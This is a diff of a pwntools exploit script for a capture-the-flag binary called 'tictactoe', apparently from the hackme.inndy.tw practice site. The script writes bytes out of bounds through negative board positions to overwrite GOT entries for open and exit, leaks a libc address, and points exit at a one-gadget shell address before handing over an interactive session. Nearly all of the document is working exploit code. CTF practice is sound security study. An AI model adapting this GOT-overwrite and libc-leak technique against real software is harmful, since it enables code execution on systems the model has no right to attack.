@@ -11,7 +11,7 @@ context(terminal = ['gnome-terminal', '-x', 'sh', '-c'], arch = 'i386', os = 'li
 localMAGIC = 0x3ac5c      #locallibc
 remoteMAGIC = 0x3ac3e      #remotelibc   #libc6_2.23-0ubuntu3_i386.so
 
-def debug(addr = '0x08048CF2'):
+def debug(addr = '0x08048d03'):
     raw_input('debug:')
     gdb.attach(io, "b *" + addr)
 
@@ -19,19 +19,24 @@ def base_addr(prog_addr,offset):
     return eval(prog_addr)-offset
 
 def input_number(number):
-    io.recv()
+    io.recv(timeout=5)
     io.sendline('9')
-    #time.sleep(2)
+    #time.sleep(1)
+    tcflush(sys.stdin, TCIFLUSH)
     io.send(number)
+    time.sleep(1)
+    tcflush(sys.stdin, TCIFLUSH)
 def input_addr(addr):
-    io.recvuntil('Input move (9 to change flavor): ')
+    io.recvuntil('Input move (9 to change flavor): ',timeout=5)
     io.sendline(addr)
+    time.sleep(1)
+    tcflush(sys.stdin, TCIFLUSH)
 
 
-elf = ELF('/home/h11p/hackme/tictactoe')
+elf = ELF('/home/h11p/ctf/tictactoe')
 
 
-io = process('/home/h11p/hackme/tictactoe')
+io = process('/home/h11p/ctf/tictactoe')
 #io = remote('hackme.inndy.tw', 7714)
 #debug()
 io.recvuntil('Play (1)st or (2)nd? ')
@@ -41,7 +46,7 @@ input_number(p32(0xd5))
 input_addr('-34')
 input_number(p32(0x8b))
 input_addr('-33')
-tcflush(sys.stdin, TCIFLUSH)
+
 
 #change open to printf_flag
 input_number(p32(0xb4))
@@ -52,7 +57,7 @@ input_number(p32(0x04))
 input_addr('-40')
 input_number(p32(0x08))
 input_addr('-39')
-tcflush(sys.stdin, TCIFLUSH)
+
 
 #change exit to loop
 input_number(p32(0xd5))
@@ -63,7 +68,7 @@ input_number(p32(0x04))
 input_addr('-44')
 input_number(p32(0x08))
 input_addr('-43')
-tcflush(sys.stdin, TCIFLUSH)
+
 
 #success get flag
 input_number(p32(0xff))
@@ -72,8 +77,8 @@ input_number(p32(0xff))
 input_addr('-8')
 input_number(p32(0xff))
 input_addr('-7')
-tcflush(sys.stdin, TCIFLUSH)
 
+#leak libc_base
 libc_leak=io.recv().splitlines()[1][19:23]
 libc_leak=u32(libc_leak)
 print hex(libc_leak)
@@ -83,27 +88,31 @@ MAGIC_addr=libc_base+localMAGIC
 print "MAGIC_addr:"+hex(MAGIC_addr)
 
 #unsuccess get flag
-input_number(p32(0x01))
-input_addr('-9')
-tcflush(sys.stdin, TCIFLUSH)
+input_number(p32(1))
+input_addr('-8')
+
+#change open to exit
+input_number(p32(0xf2))
+input_addr('-42')
+input_number(p32(0x8c))
+input_addr('-41')
+input_number(p32(0x04))
+input_addr('-40')
+input_number(p32(0x08))
+input_addr('-39')
 
 #change exit to MAGIC_addr
+Bytes_MAGIC_addr=bytearray.fromhex(hex(MAGIC_addr)[2:])
 exit_addr=-46
-for i in str(MAGIC_addr):
-    input_number(i)
+for i in Bytes_MAGIC_addr[::-1]:
+    input_number(p32(i))
     input_addr(str(exit_addr))
     exit_addr=exit_addr+1
-tcflush(sys.stdin, TCIFLUSH)
+
 
 #success get flag
 input_number(p32(0xff))
-input_addr('-9')
-input_number(p32(0xff))
 input_addr('-8')
-input_number(p32(0xff))
-input_addr('-7')
-tcflush(sys.stdin, TCIFLUSH)
-
 
 io.interactive()
 #io.recv()
